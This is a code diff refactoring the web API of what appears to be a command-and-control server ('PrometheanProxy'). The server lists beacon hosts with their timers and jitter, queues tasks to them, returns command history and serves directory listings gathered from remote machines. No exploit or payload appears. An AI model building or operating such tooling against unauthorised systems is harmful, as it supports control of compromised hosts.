@@ -24,7 +24,6 @@ def handle_join(data):
     uuid = data
     join_room(uuid)
     logger.info(f"Client joined room: {uuid}")
-    logger.info(f"Client joined room: {uuid}")
 
 
 @app.route('/api/v1/beacons', methods=['GET', 'POST'])
@@ -40,7 +39,7 @@ def api_beacons():
         logger.info(f"Command API called for beacon {uuid}")
         data = request.get_json(silent=True) or {}
         cmd_id = data.get('command_id')
-        task  = data.get('task')
+        task   = data.get('task')
         payload = data.get('data')
         if not (cmd_id and task):
             logger.error("Missing command_id or task in POST data.")
@@ -56,32 +55,9 @@ def api_beacons():
         }, room=uuid)
         return jsonify({"status": "Command added"}), 200
 
-    # GET /api/v1/beacons?... 
+    # GET /api/v1/beacons?...
     if request.method == 'GET':
-        # 1) Directory traversal tree
-        if request.args.get('dirTraversal'):
-            uuid = request.args['dirTraversal']
-            beacon = beacon_list.get(uuid)
-            if not beacon:
-                logger.error(f"dirTraversal: unknown UUID {uuid}")
-                return jsonify({"error": "Beacon not found"}), 404
-
-            tree_file = os.path.expanduser(
-                f"~/.PrometheanProxy/{uuid}/directory_traversal.json"
-            )
-            if not os.path.isfile(tree_file):
-                logger.error(f"dirTraversal file missing for UUID {uuid}")
-                return jsonify({"error": "Directory traversal not found"}), 404
-
-            try:
-                with open(tree_file, 'r') as f:
-                    tree = json.load(f)
-                return jsonify(tree), 200
-            except Exception as e:
-                logger.error(f"Error reading dirTraversal JSON: {e}")
-                return jsonify({"error": str(e)}), 500
-
-        # 2) History of non-directory_traversal commands
+        # 1) History of non-directory_traversal commands
         if request.args.get('history'):
             uuid = request.args['history']
             history_data = []
@@ -91,22 +67,23 @@ def api_beacons():
                 history_data.append({
                     "command_id": cmd.command_uuid,
                     "command": cmd.command,
+                    "data": cmd.command_data, # Added for context in history
                     "response": cmd.command_output
                 })
             logger.info(f"Returning history for beacon {uuid}")
             return jsonify({"history": history_data}), 200
 
-        # 3) List all beacons
+        # 2) List all beacons (default GET action)
         beacons_grouped = {}
         for b_id, beacon in beacon_list.items():
             beacons_grouped[b_id] = {
-                "address":         beacon.address,
-                "hostname":        beacon.hostname,
+                "address":          beacon.address,
+                "hostname":         beacon.hostname,
                 "operating_system": beacon.operating_system,
-                "last_beacon":     beacon.last_beacon,
-                "next_beacon":     beacon.next_beacon,
-                "timer":           beacon.timer,
-                "jitter":          beacon.jitter
+                "last_beacon":      beacon.last_beacon,
+                "next_beacon":      beacon.next_beacon,
+                "timer":            beacon.timer,
+                "jitter":           beacon.jitter
             }
         logger.info("Returning all beacons")
         return jsonify({"beacons": beacons_grouped}), 200
@@ -120,54 +97,67 @@ def api_beacon(uuid):
         return jsonify({"error": "Access denied"}), 403
 
     # Find the beacon with the given UUID
-    beacon_data = None
-    for beaconID, beacon in beacon_list.items():
-        if beaconID == uuid:
-            beacon_data = {
-                "address": beacon.address,
-                "hostname": beacon.hostname,
-                "operating_system": beacon.operating_system,
-                "last_beacon": beacon.last_beacon,
-                "next_beacon": beacon.next_beacon,
-                "timer": beacon.timer,
-                "jitter": beacon.jitter
-            }
-            break
-    if beacon_data:
+    beacon_obj = beacon_list.get(uuid)
+    if beacon_obj:
+        beacon_data = {
+            "address": beacon_obj.address,
+            "hostname": beacon_obj.hostname,
+            "operating_system": beacon_obj.operating_system,
+            "last_beacon": beacon_obj.last_beacon,
+            "next_beacon": beacon_obj.next_beacon,
+            "timer": beacon_obj.timer,
+            "jitter": beacon_obj.jitter
+        }
         logger.info(f"Beacon data retrieved for UUID: {uuid}")
         return jsonify({"beacon": beacon_data})
     else:
         logger.error(f"Beacon not found for UUID: {uuid}")
         return jsonify({"error": "Beacon not found"}), 404
 
+# =====================================================================
+# NEW DEDICATED ROUTE FOR DIRECTORY TRAVERSAL
+# =====================================================================
+@app.route('/api/v1/beacons/<uuid>/directory_traversal', methods=['GET'])
+def get_directory_traversal(uuid):
+    """
+    Serves the cached directory traversal JSON file for a given beacon UUID.
+    """
+    if request.remote_addr != '127.0.0.1':
+        return jsonify({"error": "Access denied"}), 403
+        
+    logger.info(f"Request received for cached directory traversal for UUID: {uuid}")
+    tree_file = os.path.expanduser(f"~/.PrometheanProxy/{uuid}/directory_traversal.json")
+
+    if not os.path.isfile(tree_file):
+        logger.warning(f"No directory traversal cache file found for UUID: {uuid}")
+        # Return an empty object if the file doesn't exist yet
+        return jsonify({})
+
+    try:
+        with open(tree_file, 'r') as f:
+            # Use make_response to correctly handle pre-formatted JSON strings
+            data = f.read()
+        response = make_response(data)
+        response.mimetype = 'application/json'
+        return response
+    except Exception as e:
+        logger.error(f"Error reading dirTraversal JSON for {uuid}: {e}")
+        return jsonify({"error": f"Error reading cache file: {e}"}), 500
+# =====================================================================
 
 @app.route('/beacons')
 def beacon():
     logger.info("Beacon page accessed")
-    if request.args.get('uuid'):
-        uuid = request.args.get('uuid')
-        beacon_data = None
-        for beaconID, beacon in beacon_list.items():
-            if beaconID == uuid:
-                beacon_data = {
-                    "address": beacon.address,
-                    "hostname": beacon.hostname,
-                    "operating_system": beacon.operating_system,
-                    "last_beacon": beacon.last_beacon,
-                    "next_beacon": beacon.next_beacon,
-                    "timer": beacon.timer,
-                    "jitter": beacon.jitter
-                }
-                logger.info(f"Beacon data found for UUID: {uuid}")
-                break
-        if beacon_data:
-            return render_template('beacon.html', beacon=beacon_data,
-                                   uuid=uuid)
-        else:
-            logger.error(f"Beacon not found for UUID: {uuid}")
-            return redirect('/')
-    else:
+    uuid = request.args.get('uuid')
+    if not uuid:
         logger.error("UUID not provided in request")
+        return redirect('/')
+
+    beacon_data = beacon_list.get(uuid)
+    if beacon_data:
+        return render_template('beacon.html', uuid=uuid)
+    else:
+        logger.error(f"Beacon not found for UUID: {uuid}")
         return redirect('/')
 
 
